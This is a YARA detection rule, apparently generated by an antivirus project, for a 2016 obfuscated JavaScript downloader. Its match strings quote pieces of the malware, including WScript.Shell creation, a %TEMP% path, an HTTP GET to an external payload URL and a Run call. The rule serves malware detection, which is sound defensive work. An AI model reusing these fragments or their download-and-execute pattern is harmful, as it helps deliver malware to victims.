rule sig_20160427_6106daa2b66fefd74c5a249e9d496770 {
  meta:
    description = "datamaliciousorder - file 20160427_6106daa2b66fefd74c5a249e9d496770.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "605726f035c8dca7a08512ad944427dd43eba8fbd19edd184638dbff01a8e238"

  strings:
    $s1  = "function VyhesJligj() {return LefssAbcly[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"v0xxoTa" ascii
    $s2  = "function VyhesJligj() {return LefssAbcly[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"v0xxoTa" ascii
    $s3  = "var LefssAbcly = function KizmqCtjzu() {return BgbfcBedyp[CynuuKettt](\"WScript\"+\".Shell\");}(), MzlyeXhrga = 11;" fullword ascii
    $s4  = "function QxrmjFtnle(ItrqvCinrs, HdfpxFexfx){LejufXdcdf = LejufXdcdf * 1; return ItrqvCinrs - HdfpxFexfx;};" fullword ascii
    $s5  = "FxgvwXwjuk[KdonrNmyyn](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var BgbfcBedyp = this[\"WScript\"];" fullword ascii
    $s7  = "function WuoxaCnfcs(){return XuyltMkvbc + \"\";};" fullword ascii
    $s8  = "if (FxgvwXwjuk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ZswhtFzqvz() {return ((JtixqAhmtp == true) && (JtixqAhmtp == RfywnQsgqb)) ? 1 : LejufXdcdf;};" fullword ascii
    $s10 = "function AevppLcebh(){return 23;};" fullword ascii
    $s11 = "var OwzidVtyrt = false;" fullword ascii
    $s12 = "JtixqAhmtp = true; " fullword ascii
    $s13 = "var JtixqAhmtp = false;" fullword ascii
    $s14 = "}while (JkuemDjqrv);" fullword ascii
    $s15 = "function KpctrIletk(){return CynuuKettt;};" fullword ascii
    $s16 = "function LsxclUnnss()" fullword ascii
    $s17 = "function XuotwIhcss(CkyduSzuuk) {var PapvvJjjeg = (1, 2, 3, 4, 5, CkyduSzuuk); return PapvvJjjeg;};" fullword ascii
    $s18 = "function RdwnmJcttw(EfidcBgaru){LefssAbcly[\"R\"+\"un\"](EfidcBgaru, LejufXdcdf, LejufXdcdf);};" fullword ascii
    $s19 = "OwzidVtyrt = true;" fullword ascii
    $s20 = "var RfywnQsgqb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}